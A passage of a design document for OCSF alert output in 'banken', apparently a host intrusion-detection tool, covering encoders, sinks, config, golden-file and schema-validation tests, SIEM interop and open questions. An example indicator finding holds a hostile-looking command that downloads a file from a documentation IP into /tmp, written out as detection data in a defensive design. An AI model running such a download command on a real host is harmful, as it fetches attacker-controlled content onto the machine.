  "evidences": [ { "process": { "pid": 4250, "name": "curl", "cmd_line": "curl -s http://192.0.2.44/x -o /tmp/loot",
                   "file": { "name": "curl", "path": "/usr/bin/curl", "type_id": 1, "type": "Regular File" },
                   "user": { "uid": "1000" } } } ],
  "observables": [
    { "type_id": 13, "type": "Command Line", "value": "curl -s http://192.0.2.44/x -o /tmp/loot" },
    { "type_id": 9, "type": "Process Name", "value": "curl" },
    { "type_id": 7, "type": "File Name", "value": "/usr/bin/curl" },
    { "type_id": 1, "type": "Hostname", "value": "hokkaido" },
    { "type_id": 2, "type": "IP Address", "value": "192.0.2.44" }
  ],
  "unmapped": { "kind": "ioc", "rule": "evil-c2.txt", "source": "auditd", "current_directory": "/home/u", "ioc_field": "CommandLine" }
}
```

No `attacks`, no `analytic.uid`: an indicator feed has neither.

## 6. Sink architecture

### 6.1 Where it plugs in

```
 engine.Match ─► Dispatcher.Dispatch(a) ─► Responder (nil today)
                                        ├─► JournalSink.Emit(a)                       (unchanged)
                                        ├─► JSONLSink.Emit(a)  ─► enc(a) ─► alerts-YYYY-MM-DD.jsonl
                                        └─► WebhookSink.Emit(a) ─► shape(a) ─► POST
                                                                      │
                                           enc / shape = EncodeAlert (today's JSON)  or  EncodeOCSF(opts)
```

The `Sink` interface, the `Dispatcher` and the `Responder` seam are untouched. OCSF is a choice of
*encoding* inside the two sinks that already carry JSON, not a fourth destination: the jsonl sink's
per-day files and retention, and the webhook sink's secret-from-file and HTTP handling, are reused
as-is. A separate `OCSFSink` would duplicate the retention/pruning code for no gain and would raise
the question of two sinks writing the same directory.

### 6.2 Signatures (sketch; names are proposals)

`internal/alert/ocsf.go` — the whole OCSF surface, no new package:

```go
package alert

// OCSFVersion is the OCSF schema version every finding declares. Bumping it
// is a deliberate change: see docs/design/ocsf-output.md §3.2.
const OCSFVersion = "1.3.0"

// OCSFOptions is the per-deployment context a finding needs that an Alert
// does not carry. main fills it once; tests inject fixed values.
type OCSFOptions struct {
    ProductVersion string           // main.version
    Hostname       string           // os.Hostname() at startup; "" omits device
    Now            func() time.Time // fallback for an Alert with a zero Time
}

// Encoder renders one alert as one JSON document (no trailing newline).
// The jsonl and webhook sinks are parameterised by it.
type Encoder func(a Alert) ([]byte, error)

// EncodeAlert is today's native shape: json.Marshal(a).
func EncodeAlert(a Alert) ([]byte, error)

// EncodeOCSF returns an Encoder that renders a Detection Finding.
func EncodeOCSF(o OCSFOptions) Encoder

// ToOCSF is the one mapping function; EncodeOCSF is json.Marshal over it.
// Exported so tests (and a future `banken check -format ocsf`) can inspect
// the struct rather than re-parse bytes.
func ToOCSF(a Alert, o OCSFOptions) OCSFFinding

// ocsfSeverity, ocsfAttacks, ocsfProcess, ocsfObservables, ocsfUID: the
// per-section helpers §4 describes, each a pure function of (Alert, OCSFOptions).
```

The finding is a plain struct tree with `json:"snake_case,omitempty"` tags, pointers for optional
objects, `[]T` for arrays. Nothing in it is reflective or generated:

```go
type OCSFFinding struct {
    ActivityID     int               `json:"activity_id"`
    ActivityName   string            `json:"activity_name,omitempty"`
    CategoryUID    int               `json:"category_uid"`
    CategoryName   string            `json:"category_name,omitempty"`
    ClassUID       int               `json:"class_uid"`
    ClassName      string            `json:"class_name,omitempty"`
    TypeUID        int               `json:"type_uid"`
    TypeName       string            `json:"type_name,omitempty"`
    Time           int64             `json:"time"`
    TimezoneOffset int               `json:"timezone_offset"`
    SeverityID     int               `json:"severity_id"`
    Severity       string            `json:"severity,omitempty"`
    StatusID       int               `json:"status_id"`
    Status         string            `json:"status,omitempty"`
    Message        string            `json:"message,omitempty"`
    Metadata       ocsfMetadata      `json:"metadata"`
    FindingInfo    ocsfFindingInfo   `json:"finding_info"`
    Evidences      []ocsfEvidence    `json:"evidences,omitempty"`
    Device         *ocsfDevice       `json:"device,omitempty"`
    Observables    []ocsfObservable  `json:"observables,omitempty"`
    RawData        string            `json:"raw_data,omitempty"`
    Unmapped       map[string]string `json:"unmapped,omitempty"`
}
// ocsfMetadata, ocsfProduct, ocsfFindingInfo, ocsfAnalytic, ocsfAttack, ocsfTactic,
// ocsfTechnique, ocsfEvidence, ocsfProcess, ocsfFile, ocsfUser, ocsfDevice,
// ocsfObservable follow the same pattern (one struct per OCSF object we emit).
```

`TimezoneOffset` and `StatusID` are not `omitempty` because `0`/`1` are meaningful; everything
that can legitimately be absent is a pointer or `omitempty`.

**Lint:** `.golangci.yml` enforces `tagliatelle: json: camel` repo-wide. OCSF attribute names are
snake_case by specification, so `ocsf.go` needs a path exclusion in `.golangci.yml`
(`exclusions.rules: - path: internal/alert/ocsf\.go$ linters: [tagliatelle]`) with a comment saying
why. A `//nolint` per struct is the alternative; the path rule is one line and documents the
exception once.

### 6.3 The sinks

```go
// jsonl.go
type JSONLConfig struct {
    Dir           string
    RetentionDays int
    Encoder       Encoder // nil = EncodeAlert
}
func NewJSONLSink(cfg JSONLConfig) (*JSONLSink, error)   // today: NewJSONLSink(dir, retentionDays)

// webhook.go
const StyleOCSF WebhookStyle = "ocsf"   // POST the Detection Finding JSON, application/json
type WebhookConfig struct {
    URLFile string
    URL     string
    Style   WebhookStyle
    Client  *http.Client
    OCSF    OCSFOptions   // used only by StyleOCSF
}
```

`JSONLSink.Emit` calls `s.enc(a)` where today it calls `json.Marshal(a)`; `WebhookSink.shape` gains
one `case StyleOCSF`. The per-day file name and the retention regexp are unchanged; a directory
holds whichever format its sink was configured with. (Mixing is possible only by reconfiguring the
same directory from one format to the other; the file name does not encode the format. Open
question 7 asks whether it should.)

### 6.4 Config and flags

`internal/config/config.go`:

```go
type JSONLConfig struct {
    Enable        bool   `yaml:"enable"`
    Dir           string `yaml:"dir"`
    RetentionDays int    `yaml:"retentionDays"`
    Format        string `yaml:"format"` // "" | "banken" | "ocsf"
}
// WebhookConfig.Style accepts "ocsf"; WebhookStyle() gains the case.
```

```yaml
alerts:
  jsonl:   { enable: true, dir: /var/log/banken, retentionDays: 30, format: ocsf }
  webhook: { enable: true, urlFile: /run/secrets/banken-webhook, style: ocsf }
```

`main.go`: `-jsonl-format banken|ocsf` next to `-jsonl-dir`; `-webhook-style` help text gains
`ocsf`. `buildSinks` builds one `OCSFOptions{ProductVersion: version, Hostname: hostname(), Now:
time.Now}` and passes it to both. The NixOS module (when it lands) gets the same two option names.
An unknown `format` is a startup error naming the value, like an unknown source type is reported —
never a silent fallback to the native shape, because an operator who asked for OCSF and got banken
JSON would find out from their SIEM.

### 6.5 Size and cost

A native alert line is ~400 bytes; the finding in §5.1 is ~1.9 KB. At banken's alert rates (a
handful per day on a quiet host) that is nothing; a noisy ruleset (the full SigmaHQ set with
`low`-level rules) multiplies jsonl growth by ~5. Retention is already by day count, so the
operator's knob exists. CPU: one `json.Marshal` of a small struct, a SHA-256 of a few hundred
bytes; irrelevant next to parsing.

## 7. Testing and validation: "is our OCSF correct?" as a deterministic test

Four layers, from cheapest to most authoritative. The first three run in `go test ./...` with the
standard library only; the fourth is a tool step like `gosec`.

### 7.1 Unit tables (`internal/alert/ocsf_test.go`)

Table-driven, in the house style: severity mapping incl. `""`, mixed case and an unknown level →
99 + sibling; tag parsing (`attack.defense-evasion` → TA0005, `attack.t1562.001` → T1562 +
T1562.001, `attack.t1059` → T1059 alone, unknown tactic dropped, non-`attack.` tags ignored);
uid determinism (same alert → same uid; any one tuple field changed → different uid; the hex is 32
chars); numeric-vs-name user split; zero-time fallback uses `Options.Now` and omits
`original_time`; empty hostname omits `device` and the hostname observable; `Raw` keys are emitted
sorted; IOC alert → analytic 9 and the right observable type by shape.

### 7.2 Golden files: one per baseline rule, through the real engine

The authoritative "what does banken's OCSF look like" test, mirroring `internal/parser`'s
`TestGolden` and its `-update` flag:

- Input: every `tests/fixtures/NAME.expect-<rule>.json` (the same events the detection fixtures
  use, so a rule's OCSF golden is produced by the rule actually firing on a real-ish event — not by a
  hand-written `Alert`). The IOC path gets a dedicated fixture with an indicator from an `ioc/`
  feed in the baseline tree (or a test-local feed) so `Kind: ioc` has a golden too.
- Fixed `OCSFOptions{ProductVersion: "test", Hostname: "golden-host", Now: 2026-10-31T12:00:00Z}`.
- Each alert from `engine.Match` is rendered by `EncodeOCSF` and compared **byte-for-byte** with
  `tests/golden/ocsf/<fixture-name>.<rule>.json` (`MarshalIndent`, trailing newline, like the parser
  goldens). The test lives in `internal/engine` (which already loads the rule tree and fixtures;
  `internal/alert` cannot import `engine` without a cycle, and an external `alert_test` package
  that reaches into `engine` would be the odd one out).
- `go test ./internal/engine -update-ocsf` regenerates; the diff is the review, which is exactly
  the discipline the parser goldens already impose.
- `TestEveryRuleHasAnOCSFGolden` mirrors `TestEveryRuleHasAFixture`: a rule without a golden fails,
  so a new rule ships with proof of what its finding looks like.

Determinism inventory (everything that could vary, and why it does not): time (fixtures have none →
injected `Now`), hostname (injected), product version (injected), uid (content digest),
`Raw`/`unmapped` ordering (sorted keys; `encoding/json` also sorts map keys), observables (fixed
order), `attacks` (tag order in the rule file), `encoding/json` struct field order (declaration
order). No randomness anywhere in the mapper.

### 7.3 Shape test (standard library, no schema file)

A JSON-level test over every golden, written against the §4 rules rather than the OCSF schema, so
it catches the mistakes the goldens would otherwise *freeze*: top-level required keys present;
`type_uid == class_uid*100 + activity_id`; `severity_id` in the enum and `severity` equal to its
caption; no `""` values and no `null` anywhere; `metadata.version == OCSFVersion`;
`metadata.profiles == ["host"]`; `finding_info.uid` is 32 hex chars and equals `metadata.uid`;
every `evidences[].process` has `pid` unless the fixture is flagged pid-less; every `device` has
`hostname`; `unmapped` keys are from the §4.8 allow-list (so a new leftover is a deliberate
addition). About 60 lines; it is the test that would have caught "we emitted `severity_id: 0` for
critical" on day one, before the golden was committed with the bug baked in.

### 7.4 Schema validation: a pinned tool, not a dependency

The real question — does the OCSF *schema* accept it — is answered by validating the goldens with
the official validator, run from `just` and CI, never linked into the binary:

```
# justfile (sketch)
# OCSF: validate the committed goldens against the pinned schema. Tooling is
# pinned like the linters are; neither tool touches go.mod.
ocsf-schema version="1.3.0":
    #!/usr/bin/env bash
    set -euo pipefail
    mkdir -p output
    [ -d output/ocsf-schema ] || git clone --depth 1 --branch "v{{version}}" \
        https://github.com/ocsf/ocsf-schema output/ocsf-schema
    uv run --with "ocsf-schema-compiler==<pin>" ocsf-schema-compiler output/ocsf-schema \
        > "output/ocsf-schema-v{{version}}.json"

ocsf-validate: ocsf-schema
    ocsf-toolkit --schema output/ocsf-schema-v1.3.0.json --events-dir tests/golden/ocsf \
        --validate --output-dir output/ocsf-validation --fail-on-validation-errors
```

- **`ocsf-toolkit`** (github.com/ocsf/ocsf-toolkit, v0.9.0, Apache-2.0, a Go binary from GitHub
  Releases; needs Go 1.25+ to build, the repo is on 1.27) validates events against a *compiled*
  schema and exits 1 on errors with `--fail-on-validation-errors`. It is profile-aware (it reads
  `metadata.profiles`), checks enums, siblings and constraints, and can also *add* observables and
  sibling captions — which is the check that our hand-written ones match.
- The **compiled schema** comes from `ocsf-schema-compiler` (Python, PyPI) over a checkout of
  `ocsf/ocsf-schema` at tag `v1.3.0`. `uv` is already the repo's Python runner (`conformance/`,
  `attackrange/`), so this is no new kind of tooling. The compiled JSON is a build artefact under
  `output/` (gitignored), regenerated from the pinned tag — not checked in (open question 8).
- CI: a separate `ocsf` job in `ci.yml`, after `default`, that installs the two pinned tools and
  runs `just ocsf-validate`; it fails on validation **errors** and prints warnings into the step
  summary (the pid-less golden is expected to warn). Pins are bumped deliberately, in their own
  commit, like the linters.

Why not the other options:

| Option | Why not (or: when) |
| --- | --- |
| Check in the JSON Schema from `https://schema.ocsf.io/schema/classes/detection_finding` and validate in `go test` | The export is **unversioned** (it is whatever the server's default is, 1.9.0 today; the `/1.3.0/schema/...` path returns HTML), its `required` list **flattens profiles** — it requires `cloud` and `osint`, so a correct finding without those profiles fails it — and draft-07 validation in Go needs `santhosh-tekuri/jsonschema` or similar: a dependency, for a schema that is wrong for our document. |
| Vendor the whole `ocsf-schema` repo and write our own checker | That is writing an OCSF validator. No. |
| `aws-samples/amazon-security-lake-ocsf-validation` (Python) | A reasonable *second* validator precisely because Security Lake is the 1.3 consumer; it can join `ocsf-validate` later. Not the primary because it is AWS-shaped (Parquet, partitions) and less maintained than the OCSF org's own tool. |
| `ocsf-toolkit` as a Go library in a `//go:build ocsfvalidate` test | Pulls its module graph into `go.sum` even behind a build tag; a separate `tools/ocsfcheck/go.mod` would avoid that but `gofumpt`'s walker (see the `fmt` recipe comment) and `go vet ./...` would then need care. The binary is simpler and has no footprint. |

### 7.5 Never-die, in the house style

`FuzzOCSF` / a `rapid` property in `internal/alert`: an arbitrary `Alert` (random strings in every
field, including non-UTF-8 and control characters in `CommandLine` — the parsers hex-decode
anything) must encode without error, the output must parse as JSON, and the §7.3 shape rules must
hold. The one external caller of this code is the dispatcher; an encoder error is returned as the
sink's `Emit` error and the other sinks still run, so a mapper bug degrades one output, never the
scan — same contract as every sink today.

### 7.6 What "done" looks like

`just default` green with the goldens and shape test; `just ocsf-validate` printing zero errors
over every golden (the pid-less one with its expected warning named); one golden per baseline rule
plus one IOC golden committed; `metadata.version` 1.3.0 in all of them. That is the PASS line.

## 8. Interop: how it reaches a SIEM

**File path.** `alerts.jsonl.format: ocsf` writes one finding per line to
`/var/log/banken/alerts-YYYY-MM-DD.jsonl`. Any log shipper tails it: Vector (`file` source → `aws_s3`
sink with Parquet encoding and the Security Lake partition keys; Vector has an OCSF-aware
Security Lake path), Fluent Bit, OpenTelemetry Collector `filelog`, Splunk Universal Forwarder. For
**Security Lake** the shipper does the JSON → Parquet conversion and the
`region=/accountId=/eventDay=` layout the custom-source docs require; banken's job ends at valid
1.3.0 JSON, one class per file, sorted by time (a day file is naturally time-ordered).

**HTTP path.** `alerts.webhook.style: ocsf` POSTs the bare finding as `application/json`. That is
what a generic OCSF HTTP receiver, Datadog's log intake, or Splunk's HEC **raw** endpoint
(`/services/collector/raw`) accept. Splunk's HEC *event* endpoint wants an `{"event": {...}}`
envelope and `Authorization: Splunk <token>` — a `style: splunk-hec` is a 10-line follow-up if
wanted, not part of this design (open question 9). Splunk's OCSF-CIM add-on then maps the finding
into CIM for Enterprise Security.

**ECS and CEF, in one paragraph.** Elastic Common Schema would be the native shape for an
Elastic-only shop (`event.kind: alert`, `rule.name`, `process.command_line`, `threat.technique.id`):
a second ~150-line mapper behind the same `Encoder` seam if there is demand, but Elastic also
ingests OCSF via an integration, so it is not needed for reach. CEF (`CEF:0|banken|banken|0.3.0|
reverse_shell|Reverse shell spawned|10|...`) is the syslog-line format ArcSight, QRadar and Sentinel
grew up on; it is lossy (flat key=value, no nesting, no ATT&CK structure) and its one real advantage
— syslog transport — banken's journal sink already provides. Neither is designed here; the `Encoder`
seam is what makes them cheap later, and OCSF is the one format that reaches the most modern
consumers without a per-SIEM mapping on the operator's side.

## 9. The dependency story, preserved

- Runtime: `encoding/json`, `crypto/sha256`, `encoding/hex`, `path`, `strings`, `os` (hostname),
  `time`. `go.mod` is unchanged: still `yaml.v3` and (test-only) `rapid`.
- The OCSF struct is ~15 small Go types written by hand against the 1.3.0 schema pages, each with a
  comment naming the OCSF object it mirrors. There is no code generation, no schema file in the
  binary, no reflection beyond `encoding/json`.
- Validation tooling (`ocsf-toolkit`, `ocsf-schema-compiler`) is installed by `just`/CI like
  `gosec` and `staticcheck` are, pinned by version, and never imported.
- The static `CGO_ENABLED=0` build and the systemd sandbox are untouched: the sink does no new I/O
  (the jsonl file and the webhook POST already exist); `os.Hostname()` is a `uname` syscall, already
  inside `@system-service`.

## 10. Risks

| Risk | Mitigation |
| --- | --- |
| **Pin drift.** A consumer rejects 1.3.0 as too old, or a bump to 1.4+ breaks the Security Lake path. | The pin is one constant; the goldens show the exact diff of a bump; §3.2's cost table is the checklist. Keep the decision explicit (open question 1). |
| **Process constraint without pid.** Findings from pid-less sources violate `at_least_one [pid, uid]`. | Prerequisite `Event.ProcessID`; the pid-less golden documents the fallback and the validator step names it as the one expected warning, so a *new* warning is visible. |
| **ATT&CK coverage looks worse than it is.** Six of seven baseline rules have no tags, so six findings carry no `attacks` until the rules are tagged. | Tag the baseline (open question 3) in the same change; the attackrange scorecard is the natural consumer of the tags. |
| **Uid collisions / uid churn.** A content digest collapses identical-tuple hits; changing the tuple later changes every uid. | Pid in the tuple; the `banken-ocsf-uid-v1` prefix versions the scheme; §4.4.1 states the trade-off. |
| **Lint friction.** `tagliatelle` rejects snake_case tags. | One path exclusion with a comment; not a repo-wide loosening. |
| **Validator fidelity.** `ocsf-toolkit` is v0.x; its constraint checks may be incomplete, and the compiled-schema pipeline has two tools to pin. | The §7.3 shape test is independent of the tool; AWS's validator can be added as a second opinion; both tools are pinned and bumped deliberately. |
| **`raw_data` is not raw.** A SOC analyst may expect the audit line. | The field's doc comment and this design say what it is; the parsers could keep the original line in `Event.Raw["_line"]` later, which the `unmapped.raw.*` rule would then carry automatically — a parser change, not a sink change. |
| **Observable `name` spelling.** Omitted in v1; some consumers want it. | Confirm the array notation with `ocsf-toolkit`'s generated observables, then add; goldens make the change reviewable. |
| **Config footgun.** Switching an existing jsonl directory to `format: ocsf` mixes two shapes in one directory across the retention window. | Document it; or encode the format in the file name (open question 7). |
| **Webhook receivers.** Someone sets `style: ocsf` on a Slack URL. | Same failure mode as `style: generic` on Slack today (a 400); no new risk. |

## 11. Open questions for Conor

1. **Version pin: 1.3.0 (Security Lake's ceiling, loses `is_alert`/`working_directory`) or 1.4.0+
   (cleaner mapping, drops Security Lake custom sources)?** Proposed: 1.3.0; revisit when a consumer
   that needs more exists or AWS raises its ceiling.
2. **Add `ProcessID`/`ParentProcessID` to `Event` (both parsers already have the values in hand;
   parser goldens change; `Event.Field` exposes `ProcessId`/`ParentProcessId` to rules)?** Proposed:
   yes, as a prerequisite PR on its own — it also unblocks SigmaHQ rules that reference `ProcessId`.
3. **Tag the six untagged baseline rules?** Proposed tags: `reverse_shell` →
   `attack.command-and-control`, `attack.t1059.004`; `download_ip_to_tmp` →
   `attack.command-and-control`, `attack.t1105`; `pipe_to_shell` → `attack.execution`,
   `attack.t1059.004`; `credential_file_read` → `attack.credential-access`, `attack.t1552.001`;
   `persistence` → `attack.persistence`, `attack.t1053.003` / `attack.t1543.002` (depends on which
   selections; may want one per mechanism); `privilege_escalation_attempt` →
   `attack.privilege-escalation`, `attack.t1548.003`. And: should a rule with **no** tags fall back to
   its directory name for the tactic (a heuristic), or carry no `attacks` (proposed)?
4. **Deterministic uid (content digest, dedups re-reads) vs random UUID per emission?** Proposed:
   deterministic, tuple as in §4.4.1.
5. **`product.vendor_name`: `"banken"`, `"conor-sometimes"`, or something else?** OCSF only needs
   `name` or `uid`; `vendor_name` is recommended and visible in every SIEM's product column.
6. **Plumb `Rule.Description` (→ `finding_info.desc`) and the source file path
   (→ `metadata.log_name`) onto `Alert`?** Both small; both widen `engine.Match`/`Alert`. Proposed:
   `desc` yes (it is the analyst's first read), `log_name` later.
7. **Should the jsonl file name encode the format (`alerts-ocsf-YYYY-MM-DD.jsonl`), so a directory
   can hold both and the retention regexp distinguishes them?** Proposed: no — one directory, one
   format, keep the file name and the prune regexp untouched; document the switch-over caveat.
8. **Compiled OCSF schema: regenerate in CI from the pinned tag (proposed) or check the JSON in
   (several MB, but makes `just ocsf-validate` offline and single-tool)?**
9. **Is a Splunk HEC envelope style (`style: splunk-hec`) wanted now, or wait for a user?**
10. **`banken check -format ocsf`** — print the finding(s) a hypothetical event would produce, for
    purple-teaming the SIEM side? Cheap given `ToOCSF`, but `check` prints rules not alerts today;
    it would need to build `Alert`s the way `engine.Match` does. Proposed: later.
11. **Declare the `security_control` profile now with `action_id: 16 Alert`?** Some consumers key
    "this is an alert" on it, and OCSF 1.3.0 has no `is_alert`. The cost is admitting banken is a
    "security control" that only ever alerts. Proposed: not yet; add it with the first response
    action, when `action_id`/`disposition_id` become true.

## References (all checked 2026-10-31)

- OCSF schema browser and API: https://schema.ocsf.io — versions list
  (`/api/versions`: default 1.9.0, 1.10.0-dev in progress); Detection Finding
  (`/1.3.0/api/classes/detection_finding`, `/api/classes/detection_finding`); objects
  `process`, `file`, `user`, `device`, `evidences`, `finding_info`, `analytic`, `attack`, `tactic`,
  `technique`, `metadata`, `product`, `observable` under `/1.3.0/api/objects/` and `/api/objects/`.
- Security Finding deprecation: `/api/classes/security_finding` (`@deprecated` since 1.1.0, use
  the specific finding classes).
- JSON Schema export (unversioned, draft-07): `https://schema.ocsf.io/schema/classes/detection_finding`.
- Amazon Security Lake custom sources (OCSF ≤ 1.3, Parquet, partitioning):
  https://docs.aws.amazon.com/security-lake/latest/userguide/custom-sources.html
- OCSF Toolkit (validator CLI + Go library, v0.9.0, Apache-2.0): https://github.com/ocsf/ocsf-toolkit
- Sigma tag namespace (`attack.<tactic>`, `attack.tNNNN[.NNN]`): SigmaHQ sigma-specification,
  `Tags_specification.md`.
- banken: `internal/alert/alert.go`, `jsonl.go`, `webhook.go`, `journal.go`; `internal/event/event.go`;
  `internal/engine/engine.go`; `internal/sigma/rule.go`, `load.go`; `internal/parser/golden_test.go`;
  `.golangci.yml`; `justfile`; `.github/workflows/ci.yml`.
